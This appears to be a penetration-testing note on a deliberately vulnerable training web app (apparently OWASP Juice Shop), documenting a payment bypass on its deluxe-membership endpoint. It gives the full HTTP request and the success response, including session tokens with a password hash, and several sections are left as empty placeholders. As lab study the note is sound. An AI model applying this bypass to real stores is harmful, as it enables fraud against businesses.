## Description

GET request returns the membership cost. POST request is issued to purchase the membership. 

## Connection Details

HTTP Methods: `GET, POST`
Parameters: 
- `paymentMode`
- `paymentId`

## Parameters 

### `?`

#### Description

#### Sample

## Vulnerabilities

### Improper input validation
#### Exploit
Send post request without any params to attain deluxe membership without purchasing. 

```http
POST /rest/deluxe-membership HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:3000/
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMiAwMzoyNjowMC4xMjcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMiAwMzoyNjowMC4xMjcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNjkxMjM4LCJleHAiOjE2NzE3MDkyMzh9.ltnCwWL1Cod4xI32QC2cFXFRfefWtKr18jCopNLyDdGUd3suiyoghSaC7UjTbVCaUYpJB_jbFGQJKMP2kXFK10RJhfMGpI3Kc6mbl5S0P5t3V6mj9LzKwE-4Xded4Uw0mVdAna9ypil9_wm1o1zUKrL7O32kKM-07IdQjUno9XE
DNT: 1
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; continueCode=dRrhQtJslUxHOT6FqfLiLSVHWPIMnfv2SPjHlpSMjH58CgPiPRh8yfROs7Jd; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMiAwMzoyNjowMC4xMjcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMiAwMzoyNjowMC4xMjcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNjkxMjM4LCJleHAiOjE2NzE3MDkyMzh9.ltnCwWL1Cod4xI32QC2cFXFRfefWtKr18jCopNLyDdGUd3suiyoghSaC7UjTbVCaUYpJB_jbFGQJKMP2kXFK10RJhfMGpI3Kc6mbl5S0P5t3V6mj9LzKwE-4Xded4Uw0mVdAna9ypil9_wm1o1zUKrL7O32kKM-07IdQjUno9XE
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

```
```http

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 919
ETag: W/"397-ehi1Zhzi50avSBXM+xC+GYZLfNQ"
Vary: Accept-Encoding
Date: Thu, 22 Dec 2022 06:41:19 GMT
Connection: close

{"status":"success","data":{"confirmation":"Congratulations! You are now a deluxe member!","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiIxMWU1OWRmMjE0YTgyZDliNGViNDdiZjNjYjYwODczY2E2NmI1NDgzMmZmYWYwNWI2ZmU3N2M1ODY4NTczNjQzIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTEyLTIyVDAzOjI2OjAwLjEyN1oiLCJ1cGRhdGVkQXQiOiIyMDIyLTEyLTIyVDA2OjQxOjE5LjM2OVoiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NzE2OTEyNzksImV4cCI6MTY3MTcwOTI3OX0.A2LyhwAbZbhCyQ_SDl3mr0BcSRvgGZC2pZJRVEICouzWhk10_h8cZDdW6fIMwl-MO6X4GnNqOGxdoHIpZJpuZxy7HYvwnYUYgDcqA3ek4I4bOu9kKm7f9mgiF24950gxViJUzR3IW9IuZ1vZ4Oafd0EJCaHtFjWdEwaxa01myPQ"}}
```

## Possible Attack Vectors

### ?


